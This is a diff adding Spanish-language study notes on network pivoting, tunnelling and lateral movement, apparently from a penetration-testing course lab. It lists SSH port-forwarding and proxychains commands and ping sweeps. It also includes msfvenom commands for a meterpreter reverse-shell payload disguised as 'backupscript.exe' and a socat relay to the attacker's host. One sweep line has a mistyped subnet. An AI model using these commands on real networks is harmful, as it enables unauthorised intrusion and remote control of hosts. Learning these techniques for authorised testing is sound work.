@@ -1,0 +1,54 @@
+### PIVOTING, TUNEL AND LATERAL MOVEMENT
+Pivoting hace referencia a la capacidad de entrar de formaas mas profunda en la red
+Tunelizacion se refiere a ofuscar nuestros comandos o peticiones para que parezcan legitimos
+Lateral movement se refiere a poder ingresar a un host gracias a otro ya vulnerado. No se refiere a host internos dentro de la red, eso seria pivoting
+
+	###	SSH
+##Local port forwarding
+ssh -L 1234:localhost:3306 Ubuntu@10.129.202.64
+#Recibo en mi puerto 1234 todo lo que el servidor recibe en su 3306
+nmap -v -sV -p1234 localhost
+#Verifico dicho port forwarding
+
+##	Dynamic port forwarding
+ssh -D 9050 ubuntu@10.129.202.64
+#Establezco el puerto 9050 como puerto que va a enviar paquetes al servidor dirigidos hacia un host mas adentrado en la red
+tail -4 /etc/proxychains.conf
+#El puerto 9050 esta como predeterminado para usar proxychain con este objetivo
+proxychains nmap -v -sn 172.16.5.1-200
+#Mediante proxychain hacemos un escaneo de nmap de una ip, rango de ips, etc. Esto nos permite que los paquetes vayan destinados al host al que nosotros no alcanzamos pero si
+#el servidor comprometido
+#Se puede usar proxychains con todos los diferentes tools que queramos.
+
+##	Reverse shell
+Para enviarnos la reverse shell del objetivo a nuestro host se debe pasar primero por el host pivote.
+De esta forma, una vez ejecutando el comando para la reverse shell, este debe ir al pivote y de aca a nuestro host
+Para esto podemos generar un payload mediante msfconsole, ponernos en escucha en nuestro host y conectarnos mediante ssh al pivote
+
+ssh -R <InternalIPofPivotHost>:<PayloadPort>:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
+#Con este comando mandamos la shell del host pivote a nuestro listener (posible comando: use exploit/multi/handler) en el 8000.
+#El puerto es el usado al crear el payload, a donde se conecta en el host pivote
+
+msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InteralIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
+#Posible payload
+
+El payload debe encontrarse en el target, apuntando hacia el host pivote para que nosotros tomemos esos paquetes en nuestro host local
+
+##	Ping sweep
+for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
+#Desde linux
+for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
+#Desde CMD
+1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
+#Desde PS
+
+	###	SOCAT
+Socat permite entablar conexiones entre dos host distintos de redes distintas sin conexions SSH funcionando como porxy que recibe en un puerto y manda a cierto host y puerto.
+
+socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
+#De esta forma (en nuestro host pivote) configuramos para que escuche local en el 8080 y lo envie a nuestro host de ataque puerto 80
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
+#Nuevamente configuramos un payload que debe se enviado al target windows apuntando al host pivote (donde esta el socat) con el respectivo puerto de escucha
+#Configuradno un listener y ejecutando el payload obtenemos la conexion
+
+
